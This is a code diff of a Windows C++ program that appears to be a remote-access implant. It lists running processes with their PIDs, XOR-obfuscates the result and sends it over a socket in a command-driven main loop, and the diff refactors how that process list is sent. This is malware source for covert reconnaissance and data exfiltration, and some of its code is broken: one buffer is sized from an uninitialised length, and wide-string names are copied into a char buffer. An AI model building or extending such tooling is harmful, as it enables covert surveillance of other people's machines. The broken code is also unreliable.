@@ -144,21 +144,21 @@ std::string getPublicIP() {
 
 // sample ListProcesses function maybe
 
-wstring GetProcessList( );
+//wstring GetProcessList( );
 BOOL ListProcessModules( DWORD dwPID );
 BOOL ListProcessThreads( DWORD dwOwnerPID );
 void printError( const TCHAR* msg );
 
-std::wstring GetProcessList()
+std::string GetProcessList()
 {
-    std::wstring processList;
+	std::string processList;
 
     // Create a snapshot of the current processes
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE)
     {
         // Error: Failed to create snapshot
-        processList = L"Failed to create snapshot";
+        processList = "Failed to create snapshot";
         return processList;
     }
 
@@ -168,16 +168,29 @@ std::wstring GetProcessList()
     if (!Process32First(hSnapshot, &pe32))
     {
         // Error: Failed to retrieve process information
-        processList = L"Failed to retrieve process information";
+        processList = "Failed to retrieve process information";
         CloseHandle(hSnapshot);
         return processList;
     }
 
     // Loop through all processes in the snapshot and append their names to the processList string
-    do
-    {
-        std::wstring processName = pe32.szExeFile;
-        processList += processName + L"\n";
+	char processName[260]; //WCHAR to char*
+	int len; // length of process string
+	char pidStr[20]; // init char* to store DWORD pid as a string
+	char process[len]; //process string to append to process string list
+    do {
+		
+		DWORD pid = pe32.th32ProcessID;
+		memcpy(processName, pe32.szExeFile, 260); // copy the smaller value (either 1024 or the length of the string) into the buffer
+		sprintf(pidStr, "%lu", pid); //put pid value into pidStr, padded with spaces
+		len = snprintf(NULL, 0, "PID: %u | Name: %s\n", pid, processName); // determine the exact length of the process string
+		
+		 // create char* of process string length, no extra null bytes
+		sprintf(process, "PID: %u | Name: %s\n", pid, processName);
+		
+		processList.append(process);
+		
+		//wcout << processName;// + L"\n";
     } while (Process32Next(hSnapshot, &pe32));
 
     // Close the snapshot handle
@@ -591,7 +604,7 @@ void sendMsg(std::string data, SOCKET sock) {
 	char lenBuf[9]; // 9 spaces for hex length int, means message length can total up to 4 gigabytes
 	strcpy(lenBuf, msgLenChar); // load xor'd data into buffer
 	printf("message length xor'd: %s\n", lenBuf); // show the xor encoded message length message
-	printf("sending %d bytes\n", strlen(lenBuf));  // show how many bytes are sent with message length message
+	printf("sending %d bytes\n\n", strlen(lenBuf));  // show how many bytes are sent with message length message
 	send(sock, lenBuf, strlen(lenBuf), 0); // send data
 	
 	// message sending logic
@@ -602,11 +615,12 @@ void sendMsg(std::string data, SOCKET sock) {
 	while(i < msgLenCount) { // while count is less than the length of the message
 		size_t numToCopy = std::min(bufferLen, msgLenCount - i); // return the smaller of the parameter values
 		memcpy(tempBuf, d + i, numToCopy); // copy the smaller value (either 1024 or the length of the string) into the buffer
-		printf("datablock: \n\n%.*s\n", sizeof(tempBuf),tempBuf); // show what is sent in datablock
+		printf("datablock: \n%.*s\n", sizeof(tempBuf),tempBuf); // show what is sent in datablock
 		i += numToCopy; // increment i by number of bytes put into the buffer, next time data will start where it ended
 		printf("sending %d bytes\n", numToCopy);  // show how many bytes are sent in this datablock
 		send(sock, tempBuf, numToCopy, 0); // send the message (message length <= 1024 bytes)
 	}
+	//delete[] tempBuf;
 }
 
 int main() {
@@ -686,25 +700,8 @@ int main() {
 		case 2: {
             printf("processes\n");
             printf("debugggggg\n");
-			wstring data2 = GetProcessList();
-            //data = GetProcessList();
-            //data = "No Processes Found";
-            //printf("list processes length: %d\n", data.length()); //debug
-            printf("debugggggg2222\n");
-            _tprintf( TEXT("\nPROCESS NAME:  %s"), data );
-            while (offset < data.length()) {
-                string chunk = data.substr(offset, DEFAULT_BUFLEN);
-                char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
-                xor_func(c); // xor the chunk
-                const char* chunkBuffer = c; // put xor'd chunk in this temp buffer
-                printf("sending %d bytes\n", strlen(chunkBuffer)); //debug
-                send(sock, chunkBuffer, strlen(chunkBuffer), 0);
-                offset += DEFAULT_BUFLEN;
-            }
-            strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
-            xor_func(buf);
-            send(sock, buf, strlen(buf), 0);
-
+			data = GetProcessList();
+			sendMsg(data, sock);
         } break;
 
 		case 3: {
